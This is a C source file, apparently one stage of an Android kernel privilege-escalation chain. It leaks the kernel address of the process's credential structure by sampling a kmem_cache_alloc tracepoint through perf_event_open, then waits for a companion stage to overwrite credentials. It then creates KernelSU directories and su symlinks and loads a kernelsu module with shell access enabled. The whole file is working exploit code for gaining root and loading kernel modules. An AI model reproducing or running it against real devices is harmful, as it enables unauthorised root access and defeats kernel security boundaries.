/*
 * cred_target.c —— 通过 perf 采样 kmem_cache_alloc 捕获本进程新 cred 地址。
 *
 * 背景：这台设备没有 cap tracepoint，且 kprobe_events 被 DAC 挡住（0640 root）。
 * 但 perf_event_open 可以直接按 tracepoint ID 采样，不需要 tracefs 写权限。
 *
 * 用法:
 *   cred_target <prepare_creds_addr> <kmem_cache_alloc_tp_id> [marker] [ko]
 *
 * 输出:
 *   CRED=0x...       当前进程（capset 后）的 cred
 *   FINTI rc=...     收到 marker 后 finit_module 的结果
 *   MODULE_LOADED
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/capability.h>
#include <linux/perf_event.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <limits.h>
#include "futex_sync.h"
#include <unistd.h>

#define PERF_PAGES 16
#define CAP_VERSION_3 0x20080522

struct cap_hdr {
    uint32_t version;
    int pid;
};

struct cap_data {
    uint32_t effective;
    uint32_t permitted;
    uint32_t inheritable;
};

static int perf_open(struct perf_event_attr *attr, pid_t pid, int cpu)
{
    return (int)syscall(SYS_perf_event_open, attr, pid, cpu, -1, 0);
}

static int capset_zero(void)
{
    struct cap_hdr h = { .version = CAP_VERSION_3, .pid = 0 };
    struct cap_data d[2] = { {0, 0, 0}, {0, 0, 0} };
    return (int)syscall(SYS_capset, &h, d);
}

/* phase1 成功后 cap_bset 被清零，本进程的 CapBnd 会立刻变成 0。
 * 由 helper 自己写 CAPBND_OK，宿主无需再等一轮 adb 交互。 */
static int cap_bnd_zero(void)
{
    FILE *f = fopen("/proc/self/status", "re");
    char line[256];
    int ok = 0;
    if (!f)
        return 0;
    while (fgets(line, sizeof line, f)) {
        if (!strncmp(line, "CapBnd:", 7)) {
            ok = (strtoull(line + 7, NULL, 16) == 0);
            break;
        }
    }
    fclose(f);
    return ok;
}

static unsigned long long read_cap_eff(void)
{
    FILE *f = fopen("/proc/self/status", "re");
    char line[256];
    unsigned long long v = 0;
    if (!f)
        return 0;
    while (fgets(line, sizeof line, f)) {
        if (!strncmp(line, "CapEff:", 7)) {
            v = strtoull(line + 7, NULL, 16);
            break;
        }
    }
    fclose(f);
    return v;
}

/* Marker files live in the directory of the marker argument; the host passes
 * /data/local/tmp/magic/marks/PHASE2_DONE. */
static void write_marker(const char *path, const char *fmt, ...)
{
    va_list ap;
    FILE *f = fopen(path, "w");
    if (!f)
        return;
    va_start(ap, fmt);
    vfprintf(f, fmt, ap);
    va_end(ap);
    fclose(f);
}

static char g_mark_dir[160] = "/data/local/tmp/magic";

static void set_mark_dir(const char *marker)
{
    const char *slash;
    size_t n;

    if (!marker)
        return;
    slash = strrchr(marker, '/');
    if (!slash || slash == marker)
        return;
    n = (size_t)(slash - marker);
    if (n >= sizeof g_mark_dir)
        n = sizeof g_mark_dir - 1;
    memcpy(g_mark_dir, marker, n);
    g_mark_dir[n] = 0;
}

static void mark_path(char *out, size_t cap, const char *name)
{
    snprintf(out, cap, "%s/%s", g_mark_dir, name);
}

/* Optional futex channel: cred_target publishes CRED/MODULE events and
 * wait_helper blocks on the shared seq word.  Failure to map is non-fatal;
 * run.sh falls back to the marker-file wait. */
static struct futex_sync *g_sync;

static void sync_open(void)
{
    char path[192];
    snprintf(path, sizeof(path), "%s/sync.futex", g_mark_dir);
    int fd = open(path, O_RDWR | O_CREAT, 0666);
    if (fd < 0)
        return;
    if (ftruncate(fd, (off_t)sizeof(struct futex_sync)) != 0) {
        close(fd);
        return;
    }
    void *p = mmap(NULL, sizeof(struct futex_sync), PROT_READ | PROT_WRITE,
                   MAP_SHARED, fd, 0);
    close(fd);
    if (p == MAP_FAILED)
        return;
    g_sync = (struct futex_sync *)p;
    memset(g_sync, 0, sizeof(struct futex_sync));
    __sync_synchronize();
}

static void sync_publish(int event, uint64_t cred, int bit16)
{
    if (!g_sync)
        return;
    g_sync->cred = cred;
    g_sync->bit16 = bit16;
    g_sync->pid = (int)getpid();
    __sync_synchronize();
    g_sync->event = event;
    __sync_synchronize();
    g_sync->seq++;
    syscall(SYS_futex, (uint32_t *)&g_sync->seq, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
}

/* 与 HOneClick perf_cred_honor.c 的 prepare_layout 一致：
 * 在 fsuid/fsgid 被清零后创建 KernelSU 用户态目录，并打印 LAYOUT_DONE。 */
static int prepare_layout(void)
{
    if (mkdir("/data/adb", 0700) != 0 && errno != EEXIST)
        return -1;
    if (mkdir("/data/adb/ksu", 0700) != 0 && errno != EEXIST)
        return -1;
    if (mkdir("/data/adb/ksu/bin", 0755) != 0 && errno != EEXIST)
        return -1;
    if (mkdir("/data/adb/modules", 0755) != 0 && errno != EEXIST)
        return -1;
    (void)symlink("/data/adb/ksud", "/data/adb/ksu/bin/su");
    (void)symlink("/data/adb/ksud", "/data/adb/ksu/bin/ksud");
    return 0;
}

static uint64_t scan_ring(struct perf_event_mmap_page *meta, size_t page,
                          uint64_t pc, uint32_t id, int *samples)
{
    size_t data_off = meta->data_offset ? meta->data_offset : page;
    size_t data_sz = meta->data_size ? meta->data_size : (size_t)PERF_PAGES * page;
    unsigned char *data = (unsigned char *)meta + data_off;
    uint64_t head = meta->data_head, tail = meta->data_tail;
    uint64_t found = 0;

    while (tail < head) {
        size_t off = (size_t)(tail % data_sz);
        struct perf_event_header h;
        memcpy(&h, data + off, sizeof h);
        if (h.size < sizeof h || off + h.size > data_sz)
            break;
        if (h.type == PERF_RECORD_SAMPLE) {
            const unsigned char *p = data + off + sizeof h;
            const unsigned char *end = data + off + h.size;
            if (p + 24 > end) { tail += h.size; continue; }
            p += 8;                 /* pid + tid */
            p += 8;                 /* time */
            uint32_t raw_size;
            memcpy(&raw_size, p, 4);
            p += 4;
            if (p + raw_size <= end && raw_size >= 24) {
                uint16_t common_type;
                memcpy(&common_type, p, 2);
                if (common_type == (uint16_t)id) {
                    uint64_t call_site, ptr;
                    memcpy(&call_site, p + 8, 8);
                    memcpy(&ptr, p + 16, 8);
                    if (call_site >= pc && call_site < pc + 0x800 &&
                        ptr >= 0xffffff8000000000ULL) {
                        found = ptr;
                        if (samples) (*samples)++;
                    }
                }
            }
        }
        tail += h.size;
    }
    meta->data_tail = tail;
    return found;
}

int main(int argc, char **argv)
{
    if (argc < 3) {
        fprintf(stderr, "usage: %s <prepare_creds_addr> <tp_id> [marker] [ko]\n", argv[0]);
        return 2;
    }
    uint64_t pc = strtoull(argv[1], NULL, 0);
    uint32_t tp = (uint32_t)strtoul(argv[2], NULL, 0);
    const char *marker = argc > 3 ? argv[3] : NULL;
    const char *ko = argc > 4 ? argv[4] : NULL;
    set_mark_dir(marker);
    if (marker)
        sync_open();

    struct perf_event_attr attr;
    memset(&attr, 0, sizeof attr);
    attr.type = PERF_TYPE_TRACEPOINT;
    attr.size = sizeof attr;
    attr.config = tp;
    attr.sample_period = 1;
    attr.sample_type = PERF_SAMPLE_TID | PERF_SAMPLE_TIME | PERF_SAMPLE_RAW;
    attr.wakeup_events = 1;
    attr.disabled = 1;
    attr.exclude_hv = 1;

    int fd = perf_open(&attr, 0, -1);
    if (fd < 0) {
        printf("ERR=perf_event_open:%d(%s)\n", errno, strerror(errno));
        return 1;
    }
    long page = sysconf(_SC_PAGESIZE);
    size_t map_sz = (size_t)(PERF_PAGES + 1) * (size_t)page;
    struct perf_event_mmap_page *meta =
        mmap(NULL, map_sz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (meta == MAP_FAILED) {
        printf("ERR=mmap:%d(%s)\n", errno, strerror(errno));
        return 1;
    }

    uint64_t cred = 0;
    int total_samples = 0;
    for (int i = 0; i < 64; i++) {
        int n = 0;
        ioctl(fd, PERF_EVENT_IOC_RESET, 0);
        ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
        int rc = capset_zero();
        usleep(30000);
        ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
        __sync_synchronize();
        uint64_t c = scan_ring(meta, (size_t)page, pc, tp, &n);
        total_samples += n;
        if (!c)
            continue;
        cred = c;
        if (((c + 0x40) >> 16) & 1)
            break;                  /* CAP_SYS_MODULE 位可用 */
        if (rc != 0) {
            printf("WARN=capset:%d(%s)\n", errno, strerror(errno));
            break;
        }
    }
    munmap(meta, map_sz);
    close(fd);

    if (!cred) {
        printf("CRED=NONE samples=%d\n", total_samples);
        fflush(stdout);
        sync_publish(FUTEX_EV_FAIL, 0, 0);
        return 3;
    }
    printf("CRED=0x%llx samples=%d bit16=%d PID=%d\n", (unsigned long long)cred,
           total_samples, (int)(((cred + 0x40) >> 16) & 1), (int)getpid());
    fflush(stdout);
    sync_publish(FUTEX_EV_CRED, cred, (int)(((cred + 0x40) >> 16) & 1));

    if (!marker)
        return 0;

    /*
     * HOneClick 的顺序：拿到 cred 后先由 t64560_v36 把 fsuid/fsgid
     * (cred+0x20) 清零；本进程随后才能创建 /data/adb 并打印 LAYOUT_DONE，
     * 再等两阶段写完成并加载模块。
     */
    int layout_done = 0;
    int capbnd_written = 0;
    for (;;) {
        if (!capbnd_written && cap_bnd_zero()) {
            char mp[192];
            mark_path(mp, sizeof mp, "CAPBND_OK");
            int fd = open(mp, O_WRONLY | O_CREAT | O_TRUNC, 0666);
            if (fd >= 0)
                close(fd);
            capbnd_written = 1;
            printf("CAPBND_OK\n");
            fflush(stdout);
        }
        if (!layout_done && prepare_layout() == 0) {
            layout_done = 1;
            printf("LAYOUT_DONE\n");
            fflush(stdout);
        }
        if (access(marker, F_OK) == 0)
            break;
        usleep(100000);
    }

    if (ko) {
        unsigned long long ce = read_cap_eff();
        int has_module = (int)((ce >> 16) & 1);
        char mp[192];
        mark_path(mp, sizeof mp, "FINTI_TRY");
        write_marker(mp, "CapEff=%#llx bit16=%d\n", ce, has_module);
        printf("FINTI_TRY ko=%s CapEff=%#llx bit16=%d\n", ko, ce, has_module);
        fflush(stdout);
        if (!has_module) {
            mark_path(mp, sizeof mp, "FINTI_SKIP");
            write_marker(mp, "no CAP_SYS_MODULE CapEff=%#llx\n", ce);
            printf("FINTI_SKIP no CAP_SYS_MODULE\n");
            fflush(stdout);
            sync_publish(FUTEX_EV_MODULE_SKIP, 0, 0);
        } else {
            /* 若已经有 kernelsu（上一次加载成功但未重启），先卸载再装，
             * 与 HOneClick reload_ksu_with_allow_shell() 一致。 */
            if (access("/sys/module/kernelsu", F_OK) == 0)
                syscall(SYS_delete_module, "kernelsu", O_NONBLOCK);
            int kfd = open(ko, O_RDONLY);
            if (kfd < 0) {
                mark_path(mp, sizeof mp, "FINTI_RC");
                write_marker(mp, "open rc=-1 errno=%d(%s)\n", errno, strerror(errno));
                printf("FINTI rc=-1 errno=%d(%s)\n", errno, strerror(errno));
                fflush(stdout);
                sync_publish(FUTEX_EV_MODULE, 0, 0);
            } else {
                errno = 0;
                long rc = syscall(SYS_finit_module, kfd,
                                  "allow_shell=1", 0);
                int e = errno;
                mark_path(mp, sizeof mp, "FINTI_RC");
                write_marker(mp, "rc=%ld errno=%d(%s)\n", rc, e, strerror(e));
                printf("FINTI rc=%ld errno=%d(%s)\n", rc, e, strerror(e));
                close(kfd);
                if (rc == 0)
                    printf("MODULE_LOADED\n");
                fflush(stdout);
                sync_publish(FUTEX_EV_MODULE, 0, 0);
            }
            fflush(stdout);
        }
    }
    for (;;)
        pause();
}
